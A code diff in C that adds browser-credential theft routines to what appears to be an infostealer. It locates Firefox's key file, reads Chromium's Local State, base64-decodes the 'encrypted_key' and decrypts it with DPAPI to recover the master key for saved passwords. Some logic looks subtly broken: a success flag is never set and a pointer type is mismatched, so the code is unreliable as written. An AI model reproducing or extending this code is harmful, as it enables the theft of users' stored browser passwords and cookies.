@@ -169,9 +169,16 @@ BOOL FireFoxWalk
 	LPWSTR lpProfilePath = NULL;
 	LPWSTR lpProfileName = NULL;
 	BOOL IsFound = FALSE;
+	LPWSTR lpFireFoxKey = NULL;
 
 	pUserData = (PUSER_DATA)lpArgs;
+	lpFireFoxKey = GetItemFileName(FirefoxKey4);
 	lpFileName = PathFindFileNameW(lpPath);
+	if (!StrCmpW(lpFileName, lpFireFoxKey)) {
+		pUserData->lpKeyPath = DuplicateStrW(lpPath, 0);
+		goto CLEANUP;
+	}
+
 	for (i = 1; i < _countof(DefaultFireFoxItems); i++) {
 		lpTemp = GetItemFileName(DefaultFireFoxItems[i]);
 		if (!StrCmpW(lpTemp, lpFileName)) {
@@ -208,6 +215,8 @@ BOOL FireFoxWalk
 	}
 
 CLEANUP:
+	FREE(lpFireFoxKey);
+
 	return FALSE;
 }
 
@@ -331,6 +340,81 @@ CLEANUP:
 	return pResult;
 }
 
+BOOL GetChromiumMasterKey
+(
+	_In_ PUSER_DATA pUserData
+)
+{
+	BOOL Result = FALSE;
+	PBYTE pFileData = NULL;
+	DWORD cbFileData = 0;
+	LPSTR lpTemp = NULL;
+	LPSTR lpEncodedKey = NULL;
+	PBYTE pEncryptedKey = NULL;
+	DWORD cbEncryptedKey = 0;
+	DATA_BLOB InputBlob;
+	DATA_BLOB OutputBlob;
+
+	SecureZeroMemory(&InputBlob, sizeof(InputBlob));
+	SecureZeroMemory(&OutputBlob, sizeof(OutputBlob));
+	if (pUserData->lpKeyPath != NULL) {
+		pFileData = ReadFromFile(pUserData->lpKeyPath, &cbFileData);
+		if (pFileData != NULL && cbFileData > 0) {
+			lpTemp = StrStrA(pFileData, "\"os_crypt\":");
+			if (lpTemp != NULL) {
+				lpEncodedKey = SearchMatchStrA(lpTemp, "\"encrypted_key\":\"", "\"},\"");
+				pEncryptedKey = Base64Decode(lpEncodedKey, &cbEncryptedKey);
+				InputBlob.pbData = &pEncryptedKey[5];
+				InputBlob.cbData = cbEncryptedKey - 5;
+				if (!CryptUnprotectData(&InputBlob, NULL, NULL, NULL, NULL, 0, &OutputBlob)) {
+					LOG_ERROR("CryptUnprotectData", GetLastError());
+					goto CLEANUP;
+				}
+
+				pUserData->pMasterKey = ALLOC(OutputBlob.cbData);
+				memcpy(pUserData->pMasterKey, OutputBlob.pbData, OutputBlob.cbData);
+				LocalFree(OutputBlob.pbData);
+			}
+		}
+	}
+
+CLEANUP:
+	FREE(lpEncodedKey);
+	FREE(pEncryptedKey);
+	FREE(pFileData);
+
+	return Result;
+}
+
+PUSER_DATA* PickBrowsers
+(
+	_Out_ PDWORD pdwNumberOfUserDatas
+)
+{
+	PUSER_DATA* pResult = NULL;
+	PUSER_DATA pFireFoxData = NULL;
+	DWORD dwNumberOfUserDatas = 0;
+
+	pResult = PickChromium(&dwNumberOfUserDatas);
+	pFireFoxData = PickFireFox();
+	if (pFireFoxData != NULL) {
+		if (pResult != NULL) {
+			pResult = REALLOC(pResult, sizeof(PUSER_DATA) * (dwNumberOfUserDatas + 1));
+			pResult[dwNumberOfUserDatas++] = pFireFoxData;
+		}
+		else {
+			pResult = pFireFoxData;
+			dwNumberOfUserDatas = 1;
+		}
+	}
+
+	if (pdwNumberOfUserDatas != NULL) {
+		*pdwNumberOfUserDatas = dwNumberOfUserDatas;
+	}
+
+	return pResult;
+}
+
 VOID FreeUserData
 (
 	_In_ PUSER_DATA pUserData
@@ -343,6 +427,7 @@ VOID FreeUserData
 		FREE(pUserData->lpUserDataPath);
 		FREE(pUserData->lpBrowserName);
 		FREE(pUserData->lpKeyPath);
+		FREE(pUserData->pMasterKey);
 		for (i = 0; i < pUserData->cProfile; i++) {
 			FREE(pUserData->ProfileList[i]->lpProfileName);
 			for (j = 0; j < ProfileItemEnd; j++) {
